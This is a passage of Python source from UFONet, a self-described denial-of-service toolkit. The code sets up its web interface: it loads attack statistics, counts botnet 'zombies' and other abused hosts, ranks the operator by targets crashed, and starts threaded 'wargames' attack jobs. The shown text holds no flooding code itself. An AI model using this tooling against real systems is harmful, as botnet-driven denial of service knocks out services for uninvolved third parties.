        # adding AnonTwi (anontwi.03c8.net) cyphering -> AES256+HMAC-SHA1
        self.trans_5C = "".join([chr (x ^ 0x5c) for x in xrange(256)])
        self.trans_36 = "".join([chr (x ^ 0x36) for x in xrange(256)])
        f.close()
        f = open(self.blackholes) # double extract blackholes (nodes.dat)
        self.blackholes_text = f.read()
        f.close()
        f = open(self.blackholes)
        self.blackholes_block = f.readlines()
        f.close()
        self.list_blackholes = []
        for b in self.blackholes_block:
            self.list_blackholes.append(b)
        self.blackholes_datetime = time.ctime(os.path.getctime('server/nodes.dat')) # extract nodes.dat datetime
        if self.blackholes_datetime == self.release_date_file: # never connected to feeds
            self.blackholes_status_color = "red" # set status color for blackholes to 'red'
        else:
            self.blackholes_status_color = "green" # set status color for blackholes to 'green'
        f = open(self.news) # double extract news
        self.news_text = f.read()
        f.close()
        f = open(self.news)
        self.news_block = f.readlines()
        f.close()
        self.list_news = []
        for n in self.news_block:
            self.list_news.append(n)
        self.news_datetime = time.ctime(os.path.getctime('server/news.txt')) # extract news.txt datetime
        if self.news_datetime == self.release_date_file: # never connected to feeds
            self.news_status_color = "red" # set status color for news to 'red'
        else:
            self.news_status_color = "green" # set status color for news to 'green'
        f = open(self.board_file) # double extract board
        self.moderator_text = f.read()
        f.close()
        f = open(self.board_file)
        self.moderator_block = f.readlines()
        f.close()
        self.list_moderator = []
        for n in self.moderator_block:
            self.list_moderator.append(n) 
        f = open(self.grid_file) # double grid board
        self.grid_text = f.read()
        f.close()
        f = open(self.grid_file)
        self.grid_block = f.readlines()
        f.close()
        self.list_grid = []
        for n in self.grid_block:
            self.list_grid.append(n)
        f = open(self.wargames_file) # double wargames board
        self.wargames_text = f.read()
        f.close()
        f = open(self.wargames_file)
        self.wargames_block = f.readlines()
        f.close()
        self.list_wargames = []
        for n in self.wargames_block:
            self.list_wargames.append(n)
        f = open(self.missions) # double extract missions
        self.missions_text = f.read()
        f.close()
        f = open(self.missions)
        self.missions_block = f.readlines()
        f.close()
        self.list_missions = []
        for m in self.missions_block:
            self.list_missions.append(m)
        self.missions_datetime = time.ctime(os.path.getctime('server/missions.txt')) # extract missions.txt datetime
        if self.missions_datetime == self.release_date_file: # never connected to feeds
            self.missions_status_color = "red" # set status color for missions to 'red'
        else:
            self.missions_status_color = "green" # set status color for missions to 'green'
        stats_json_file = open(self.mothership_stats_file, "r") # extract mothership stats
        data = json.load(stats_json_file)
        stats_json_file.close()
        self.abductor = Abductor(self) # call abductor for data size conversor
        self.aflying = data["flying"]
        self.ascanner = data["scanner"]
        self.atransferred = data["transferred"]
        self.amax_chargo = data["max_chargo"]
        self.amissions = data["missions"]
        self.acompleted = data["completed"]
        self.aloic = data["loic"]
        self.aloris = data["loris"]
        self.aufosyn = data["ufosyn"]
        self.tcrashed = data["crashed"]
        if int(self.acompleted) > 0: # check for attacks completed
            self.mothership_acc = Decimal((int(self.tcrashed) * 100) / int(self.acompleted)) # decimal rate: crashed*100/completed
        else:
            self.mothership_acc = 100 # WarGames: "the only way to win in Nuclear War is not to play"
        if int(self.acompleted) < 5: # generating motherships commander ranks by rpg/experiences
            self.ranking = "Rookie"
        elif int(self.acompleted) > 4 and int(self.tcrashed) < 1: # add first ranking step on 5 complete attacks
            self.ranking = "Mercenary"
        elif int(self.tcrashed) > 1 and int(self.tcrashed) < 5: # second ranking step with almost 1 crashed
            self.ranking = "Bandit"
        elif int(self.tcrashed) > 5: # third ranking value is only for real "crashers" ;-)
            self.ranking = "UFOmmander!"
        f = open(self.zombies_file)
        self.zombies = f.readlines()
        self.zombies = [zombie.replace('\n', '') for zombie in self.zombies]
        self.list_zombies = []
        for zombie in self.zombies:
            t = urlparse(zombie)
            name_zombie = t.netloc
            self.list_zombies.append(name_zombie)
        self.num_zombies = str(len(self.zombies))
        f.close()
        f = open(self.aliens_file)
        self.aliens = f.readlines()
        self.aliens = [alien.replace('\n', '') for alien in self.aliens]
        self.list_aliens = []
        for alien in self.aliens:
            t = urlparse(alien)
            name_alien = t.netloc
            self.list_aliens.append(name_alien)
        self.num_aliens = str(len(self.aliens))
        f.close()
        f = open(self.droids_file)
        self.droids = f.readlines()
        self.droids = [droid.replace('\n', '') for droid in self.droids]
        self.list_droids = []
        for droid in self.droids:
            t = urlparse(droid)
            name_droid = t.netloc
            self.list_droids.append(name_droid)
        self.num_droids = str(len(self.droids))
        f.close()
        f = open(self.ucavs_file)
        self.ucavs = f.readlines()
        self.ucavs = [ucav.replace('\n', '') for ucav in self.ucavs]
        self.list_ucavs = []
        for ucav in self.ucavs:
            t = urlparse(ucav)
            name_ucav = t.netloc
            self.list_ucavs.append(name_ucav)
        self.num_ucavs = str(len(self.ucavs))
        f.close()
        f = open(self.rpcs_file)
        self.rpcs = f.readlines()
        self.rpcs = [rpc.replace('\n', '') for rpc in self.rpcs]
        self.list_rpcs = []
        for rpc in self.rpcs:
            t = urlparse(rpc)
            name_rpc = t.netloc
            self.list_rpcs.append(name_rpc)
        self.num_rpcs = str(len(self.rpcs))
        f.close()
        self.total_botnet = str(int(self.num_zombies) + int(self.num_aliens) + int(self.num_droids) + int(self.num_ucavs) + int(self.num_rpcs))
        f = open(self.wargames_file, "r")
        ls = f.readlines()
        f.close()
        self.supply_wargames = 0
        self.wargames_engage_list = []
        for l in ls:
            if "!!!" in l:
                self.wargames_engage_list.append(l)
                self.supply_wargames = self.supply_wargames + 1
        if self.supply_wargames > 0:
            if self.supply_wargames == 1:
                c_supply = "wargame"
            else:
                c_supply = "wargames"
            self.current_tasks = '<br>-----------------------------------\n\n+ Jobs: <a href="/wargames">' + str(self.supply_wargames) + '</a> '+c_supply+''
            self.wargames_engage_routine(self.wargames_engage_list) # threaded jobs engage routine
        else:
           self.current_tasks = ""
        self.options = UFONetOptions()
        self.pages = {}
        self.pages["/header"] = """<!DOCTYPE html><html>
<head>
<link rel="icon" type="image/png" href="/images/favicon.ico" />
<meta name="author" content="psy">
<meta name="robots" content="noindex, nofollow">
<meta http-equiv="content-type" content="text/xml; charset=utf-8" /> 
<title>UFONet - Denial of Service Toolkit</title>
<script language="javascript" src="/lib.js"></script>
<script language="javascript" src="js/stars.js"></script>
<style>
body{font-size:15px}a,a:hover{outline:none;color:red;font-size:14px;font-weight:700}nav ul ul{display:none}nav ul li:hover > ul{display:block}nav ul{list-style:none;position:relative;display:inline-table}nav ul:after{content:"";clear:both;display:block}nav ul li{font-size:12px}nav ul li a{display:block;padding:2px 3px}html,body{height:100%}ul,li{margin:0;padding:0}.ringMenu{width:100px;margin:80px auto}.ringMenu ul{list-style:none;position:relative;width:100px;color:#fff}.ringMenu ul a{color:#fff}.ringMenu ul li{-webkit-transition:all .3s ease-in-out;-moz-transition:all .3s ease-in-out;-o-transition:all .3s ease-in-out;transition:all .3s ease-in-out}.ringMenu ul li a{display:block;width:100px;height:100px;background:rgba(50,50,50,0.7);text-align:center;line-height:100px;-webkit-border-radius:50px;-moz-border-radius:50px;border-radius:50px}.ringMenu ul li a:hover{background:rgba(230,150,20,0.7)}.ringMenu ul li:not(.main){-webkit-transform:rotate(-180deg) scale(0);-moz-transform:rotate(-180deg) scale(0);-o-transform:rotate(-180deg) scale(0);transform:rotate(-180deg) scale(0);opacity:0}.ringMenu:hover ul li{-webkit-transform:rotate(0) scale(1);-moz-transform:rotate(0) scale(1);-o-transform:rotate(0) scale(1);transform:rotate(0) scale(1);opacity:1}.ringMenu ul li.top{-webkit-transform-origin:50% 152px;-moz-transform-origin:50% 152px;-o-transform-origin:50% 152px;transform-origin:50% 152px;position:absolute;top:-102px;left:0}.ringMenu ul li.bottom{-webkit-transform-origin:50% -52px;-moz-transform-origin:50% -52px;-o-transform-origin:50% -52px;transform-origin:50% -52px;position:absolute;bottom:-102px;left:0}.ringMenu ul li.right{-webkit-transform-origin:-52px 50%;-moz-transform-origin:-52px 50%;-o-transform-origin:-52px 50%;transform-origin:-52px 50%;position:absolute;top:0;right:-102px}.ringMenu ul li.left{-webkit-transform-origin:152px 50%;-moz-transform-origin:152px 50%;-o-transform-origin:152px 50%;transform-origin:152px 50%;position:absolute;top:0;left:-102px}textarea{padding:30px 0}
</style>"""

        self.pages["/footer"] = """</center></body>
</html>
"""
        self.pages["/ufonet-logo.png"] = base64.b64decode("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